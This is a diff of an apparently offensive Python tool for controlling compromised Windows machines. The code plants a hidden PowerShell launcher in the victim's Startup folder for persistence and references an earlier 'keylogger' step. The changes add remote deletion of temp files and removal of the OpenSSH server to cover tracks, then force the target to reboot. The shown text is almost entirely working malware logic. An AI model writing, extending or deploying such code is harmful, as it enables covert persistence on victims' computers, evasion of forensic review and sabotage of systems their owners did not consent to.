@@ -236,15 +236,19 @@ def killswitch(address, password, working, username):
     controller_command = f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && echo powershell Start-Process powershell.exe -windowstyle hidden $env:temp/TOhjZsWluf.ps1 >> GiLqXiexKP.cmd"
     print("[+] Killswitch prepped")
 
-    # installing keylogger
+    # installing killswitch
     print("[*] Installing killswitch...")
     remote_command(address, password, killswitch_command)
     print("[*] Installing controller...")
     remote_command(address, password, controller_command)
     print("[+] Killswitch installed sucessfully\n")
+       
+    # remove files
+    remote_command(address, password, " powershell /c Remove-Item $env:temp/* -r; Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0")
 
     # execute logger
-    print("\n[!] Restart target computer to execute")
+    print("\n[*] Restart target computer...")
+
 
 # custom upload
 def upload(address, password, working):
@@ -457,6 +461,8 @@ def cli(arguments):
                 confirm = input(header)
                 if confirm == "y":
                     killswitch(ipv4, password, working_direcory, target_username)
+                    remote_command(ipv4, password, "shutdown /r")
+
                 else:
                     main()
 
